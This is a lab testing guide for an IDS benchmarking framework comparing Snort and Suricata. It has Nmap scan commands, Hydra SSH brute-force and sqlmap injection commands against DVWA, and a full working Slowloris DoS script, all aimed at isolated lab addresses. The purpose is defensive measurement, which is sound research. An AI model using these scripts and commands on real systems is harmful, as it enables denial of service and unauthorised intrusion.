# ARCHIVIRT Testing Guide

**Author:** Яснеманегре САВАДОГО (Аспирант СПбГУПТД)  
**Framework:** ARCHIVIRT — Automated Reproducible Cyber Hybrid Infrastructure for VIRTual SOAR Testing Labs

---

## Overview

This guide details all five standardized test scenarios validated in the ARCHIVIRT paper, including execution steps, expected detections, and metric collection. All scenarios are executed 10 times each to ensure reproducibility (<2% standard deviation).

---

## Lab Configuration (Reference)

| VM Role    | Network         | IP Address  | vCPU | RAM  |
|------------|-----------------|-------------|------|------|
| manager    | 10.0.5.0/24     | 10.0.5.10   | 2    | 4 GB |
| attacker   | 10.0.4.0/24     | 10.0.4.10   | 2    | 4 GB |
| monitor    | 10.0.3.0/24     | 10.0.3.10   | 2    | 4 GB |
| target-01  | 10.0.2.0/24     | 10.0.2.11   | 2    | 4 GB |
| target-02  | 10.0.2.0/24     | 10.0.2.12   | 2    | 4 GB |
| target-03  | 10.0.2.0/24     | 10.0.2.13   | 2    | 4 GB |

IDS engine is selectable: `--extra-vars "ids_engine=snort"` or `--extra-vars "ids_engine=suricata"`.

---

## Pre-Test Checklist

```bash
# 1. Verify all VMs are running
virsh list --all

# 2. Verify SSH access
ssh -i ~/.ssh/archivirt_key ubuntu@10.0.5.10 "hostname"
ssh -i ~/.ssh/archivirt_key ubuntu@10.0.4.10 "hostname"
ssh -i ~/.ssh/archivirt_key ubuntu@10.0.3.10 "hostname"

# 3. Verify IDS service (on monitor)
ssh -i ~/.ssh/archivirt_key ubuntu@10.0.3.10 \
  "sudo systemctl status snort || sudo systemctl status suricata"

# 4. Verify targets are reachable from attacker
ssh -i ~/.ssh/archivirt_key ubuntu@10.0.4.10 \
  "ping -c 1 10.0.2.11 && ping -c 1 10.0.2.12 && ping -c 1 10.0.2.13"

# 5. Run deployment tests
cd /opt/archivirt && python -m pytest tests/ -v
```

---

## Scenario SCN-001: Port Scan Detection

**Objective:** Validate IDS detection of Nmap TCP/UDP scanning techniques.  
**Tool:** Nmap  
**Target:** 10.0.2.11 (primary)

### Execution

```bash
# From attacker VM (10.0.4.10)

# SYN Scan (stealth)
sudo nmap -sS -p 1-1024 --timing T3 10.0.2.11

# NULL Scan
sudo nmap -sN -p 1-65535 10.0.2.11

# XMAS Scan
sudo nmap -sX -p 22,80,443,3306 10.0.2.11

# UDP Scan
sudo nmap -sU -p 53,161,162,500 10.0.2.11

# OS Detection + Service Version
sudo nmap -A -p 22,80,3306 10.0.2.0/24
```

### Expected IDS Alerts

| Scan Type   | Snort 3 Rule SID | Suricata Rule SID | Expected Detection |
|-------------|-----------------|-------------------|--------------------|
| SYN Scan    | 1000001         | 2000001           | 100%               |
| NULL Scan   | 1000002         | 2000002           | 100%               |
| XMAS Scan   | 1000003         | 2000003           | 100%               |
| UDP Scan    | 1000004         | 2000004           | ~95%               |

### Validation Results (Paper)

| IDS        | Detection Rate | False Positive Rate | Avg Latency |
|------------|---------------|---------------------|-------------|
| Snort 3    | 100.0%        | 0.5%                | 12.3 ms     |
| Suricata 6 | 100.0%        | 0.2%                | 8.7 ms      |

### Check Alerts

```bash
# Snort alerts
ssh ubuntu@10.0.3.10 "sudo tail -f /var/log/snort/alert_fast.txt"

# Suricata alerts
ssh ubuntu@10.0.3.10 "sudo tail -f /var/log/suricata/fast.log"
```

---

## Scenario SCN-002: SSH Brute-Force Detection

**Objective:** Detect dictionary-based SSH credential attacks.  
**Tool:** Hydra  
**Target:** 10.0.2.11 (SSH on port 22)

### Execution

```bash
# From attacker VM

# Basic brute-force
hydra -L /opt/archivirt/wordlists/users.txt \
      -P /opt/archivirt/wordlists/passwords.txt \
      -t 4 -f ssh://10.0.2.11

# Verbose mode for logging
hydra -L /opt/archivirt/wordlists/users.txt \
      -P /opt/archivirt/wordlists/passwords.txt \
      -t 4 -V -o /tmp/hydra_results.txt \
      ssh://10.0.2.11

# Multi-target
for ip in 10.0.2.11 10.0.2.12 10.0.2.13; do
  hydra -l admin -P /opt/archivirt/wordlists/passwords.txt \
        -t 2 ssh://$ip &
done
wait
```

### Expected IDS Alerts

Detection is triggered by:
- **Snort 3**: Threshold of 5 failed SSH attempts in 10 seconds (SID: 1000010)
- **Suricata 6**: SSH brute-force pattern matching (SID: 2000010)

### Validation Results (Paper)

| IDS        | Detection Rate | False Positive Rate | Avg Latency |
|------------|---------------|---------------------|-------------|
| Snort 3    | 98.5%         | 1.1%                | 45.6 ms     |
| Suricata 6 | 99.8%         | 0.8%                | 32.1 ms     |

---

## Scenario SCN-003: SQL Injection Exploitation

**Objective:** Detect web application SQL injection attacks.  
**Tool:** sqlmap  
**Target:** 10.0.2.11 (DVWA on port 80)

### Pre-Conditions

```bash
# Verify DVWA is running on target-01
curl -s http://10.0.2.11/dvwa/login.php | grep -i "login"

# Set DVWA security to Low (required for sqlmap)
# Login: admin / password
```

### Execution

```bash
# From attacker VM

# UNION-based injection
sqlmap -u "http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<session_id>;security=low" \
       --technique=U --level=3 --risk=2 \
       --batch --output-dir=/tmp/sqlmap_output

# Boolean-based blind injection
sqlmap -u "http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<session_id>;security=low" \
       --technique=B --level=3 \
       --batch

# Time-based blind injection
sqlmap -u "http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<session_id>;security=low" \
       --technique=T --level=3 \
       --batch

# Database enumeration
sqlmap -u "http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<session_id>;security=low" \
       --dbs --batch
```

### Expected IDS Alerts

Signatures triggered:
- `UNION SELECT` in HTTP request body (SID: 1000020 / 2000020)
- Boolean patterns `OR 1=1` / `AND 1=2` (SID: 1000021 / 2000021)
- sqlmap User-Agent string (SID: 1000022 / 2000022)

### Validation Results (Paper)

| IDS        | Detection Rate | False Positive Rate | Avg Latency |
|------------|---------------|---------------------|-------------|
| Snort 3    | 85.2%         | 0.3%                | 102.4 ms    |
| Suricata 6 | 92.7%         | 0.4%                | 87.9 ms     |

> **Note:** Suricata's advantage here comes from HTTP payload analysis using `http.uri` and `http.user_agent` keywords with fast_pattern matching.

---

## Scenario SCN-004: Slowloris DDoS Detection

**Objective:** Detect slow HTTP DoS attacks that exhaust web server connections.  
**Tool:** Custom Slowloris Python script  
**Target:** 10.0.2.11 (Apache on port 80)

### Execution

```bash
# From attacker VM

# Basic Slowloris attack (100 sockets)
python3 /opt/archivirt/tools/slowloris.py \
  --host 10.0.2.11 --port 80 \
  --sockets 100 --sleep-time 15

# Intensified attack (200 sockets)
python3 /opt/archivirt/tools/slowloris.py \
  --host 10.0.2.11 --port 80 \
  --sockets 200 --sleep-time 10 \
  --duration 300

# Monitor target server response time during attack
while true; do
  curl -o /dev/null -s -w "%{time_total}\n" http://10.0.2.11/
  sleep 5
done
```

### Slowloris Script (`/opt/archivirt/tools/slowloris.py`)

```python
#!/usr/bin/env python3
"""Slowloris HTTP DoS simulation for ARCHIVIRT testing."""
import socket
import time
import argparse
import logging
import random

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

def create_socket(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((host, port))
    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
    s.send(f"Host: {host}\r\n".encode("utf-8"))
    s.send("User-Agent: Mozilla/5.0 (Slowloris Test)\r\n".encode("utf-8"))
    s.send("Accept-language: en-US,en;q=0.5\r\n".encode("utf-8"))
    return s

def slowloris(host, port, sockets, sleep_time, duration):
    socket_list = []
    start = time.time()

    logging.info(f"Attacking {host}:{port} with {sockets} sockets")

    for _ in range(sockets):
        try:
            s = create_socket(host, port)
            socket_list.append(s)
        except socket.error:
            pass

    while time.time() - start < duration:
        logging.info(f"Active sockets: {len(socket_list)}")
        for s in list(socket_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                socket_list.remove(s)

        # Re-create dead sockets
        diff = sockets - len(socket_list)
        for _ in range(diff):
            try:
                s = create_socket(host, port)
                socket_list.append(s)
            except socket.error:
                pass

        time.sleep(sleep_time)

    # Cleanup
    for s in socket_list:
        s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Slowloris DoS Simulation")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--sockets", type=int, default=150)
    parser.add_argument("--sleep-time", type=float, default=15.0)
    parser.add_argument("--duration", type=float, default=120.0)
    args = parser.parse_args()

    slowloris(args.host, args.port, args.sockets, args.sleep_time, args.duration)
```

### Validation Results (Paper)

| IDS        | Detection Rate | False Positive Rate | Avg Latency |
|------------|---------------|---------------------|-------------|
| Snort 3    | 65.3%         | 0.0%                | 210.5 ms    |
| Suricata 6 | 78.9%         | 0.0%                | 185.2 ms    |

> **Note:** Slowloris is the hardest scenario for both engines. Suricata's flow-based analysis gives it a significant advantage (+13.6% detection).

---

## Scenario SCN-005: Normal Traffic Baseline (False Positive Measurement)

**Objective:** Establish baseline false positive rate with legitimate traffic only.  
**Tool:** Custom Python traffic generator  
**Target:** 10.0.2.11, 10.0.2.12, 10.0.2.13

### Execution

```bash
# From attacker VM — run normal traffic generator
python3 /opt/archivirt/tools/normal_traffic.py \
  --targets 10.0.2.11,10.0.2.12,10.0.2.13 \
  --duration 300 \
  --output /tmp/normal_traffic_results.json
```

### Normal Traffic Generator (`/opt/archivirt/tools/normal_traffic.py`)

```python
#!/usr/bin/env python3
"""Normal traffic simulation for ARCHIVIRT baseline (false positive) testing."""
import subprocess
import time
import json
import argparse
import random
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

NORMAL_ACTIONS = [
    lambda t: subprocess.run(["curl", "-s", "-o", "/dev/null", f"http://{t}/"],
                              capture_output=True, timeout=5),
    lambda t: subprocess.run(["curl", "-s", "-o", "/dev/null", f"http://{t}/dvwa/"],
                              capture_output=True, timeout=5),
    lambda t: subprocess.run(["ssh", "-o", "ConnectTimeout=3", "-o",
                               "StrictHostKeyChecking=no", f"ubuntu@{t}", "uptime"],
                              capture_output=True, timeout=5),
    lambda t: subprocess.run(["ping", "-c", "1", t],
                              capture_output=True, timeout=5),
]

def run_normal_traffic(targets, duration):
    start = time.time()
    actions_run = 0

    while time.time() - start < duration:
        target = random.choice(targets)
        action = random.choice(NORMAL_ACTIONS)
        try:
            action(target)
            actions_run += 1
            logging.info(f"Normal action on {target} ({actions_run} total)")
        except Exception as e:
            logging.warning(f"Action failed: {e}")
        time.sleep(random.uniform(2, 8))

    return actions_run

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Normal Traffic Simulator")
    parser.add_argument("--targets", required=True,
                        help="Comma-separated target IPs")
    parser.add_argument("--duration", type=float, default=300.0)
    parser.add_argument("--output", default="/tmp/normal_traffic.json")
    args = parser.parse_args()

    targets = args.targets.split(",")
    count = run_normal_traffic(targets, args.duration)

    result = {"duration": args.duration, "targets": targets, "actions": count}
    with open(args.output, "w") as f:
        json.dump(result, f, indent=2)
    print(json.dumps(result, indent=2))
```

### Validation Results (Paper) — False Positive Rates Only

| IDS        | False Positive Rate |
|------------|---------------------|
| Snort 3    | 0.8%                |
| Suricata 6 | 0.3%                |

---

## Running All Scenarios Automatically

```bash
# From manager VM or host machine
cd /opt/archivirt

# Run all 5 scenarios × 10 repetitions
bash scripts/run_tests.sh --engine snort --runs 10 --output /opt/archivirt/results/snort/
bash scripts/run_tests.sh --engine suricata --runs 10 --output /opt/archivirt/results/suricata/

# Collect and aggregate metrics
python3 scripts/collect_metrics.py \
  --snort-dir /opt/archivirt/results/snort/ \
  --suricata-dir /opt/archivirt/results/suricata/ \
  --output /opt/archivirt/results/metrics.json

# Generate HTML report with charts
python3 scripts/generate_report.py \
  --metrics /opt/archivirt/results/metrics.json \
  --output /opt/archivirt/results/report.html

echo "Report available at: /opt/archivirt/results/report.html"
```

---

## Metric Definitions

| Metric | Formula | Description |
|--------|---------|-------------|
| Detection Rate (DR) | TP / (TP + FN) × 100 | % of attacks correctly alerted |
| False Positive Rate (FPR) | FP / (FP + TN) × 100 | % of normal traffic incorrectly alerted |
| Alert Latency | T_alert − T_attack | Time from attack start to first alert |
| CPU Usage | avg(cpu%) during test | Monitored via Telegraf |
| RAM Usage | peak(ram_MB) during test | Monitored via Telegraf |

---

## Reproducibility Validation

ARCHIVIRT guarantees <2% standard deviation across 10 runs per scenario. To verify:

```bash
python3 - <<'EOF'
import json, statistics, glob

for engine in ['snort', 'suricata']:
    for scenario in ['port_scan', 'ssh_bruteforce', 'sqli', 'slowloris']:
        files = glob.glob(f'/opt/archivirt/results/{engine}/{scenario}_run_*.json')
        rates = []
        for f in files:
            with open(f) as fp:
                data = json.load(fp)
            rates.append(data.get('detection_rate', 0))
        if rates:
            std = statistics.stdev(rates) if len(rates) > 1 else 0
            mean = statistics.mean(rates)
            print(f"{engine}/{scenario}: mean={mean:.1f}% std={std:.2f}% {'✓ OK' if std < 2 else '✗ HIGH'}")
EOF
```

Expected output: all scenarios show `std < 2.0%` → framework reproducibility confirmed.

---

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| IDS not detecting attacks | Wrong network interface | Check `MONITOR_IFACE` in IDS config |
| sqlmap fails | DVWA not running | `sudo systemctl start apache2` on target-01 |
| Hydra blocked | fail2ban active | Disable fail2ban on targets for testing |
| Slowloris fails | Apache connection limit too high | Lower `MaxRequestWorkers` to 50 |
| No metrics in InfluxDB | Telegraf not running | `sudo systemctl restart telegraf` on monitor |
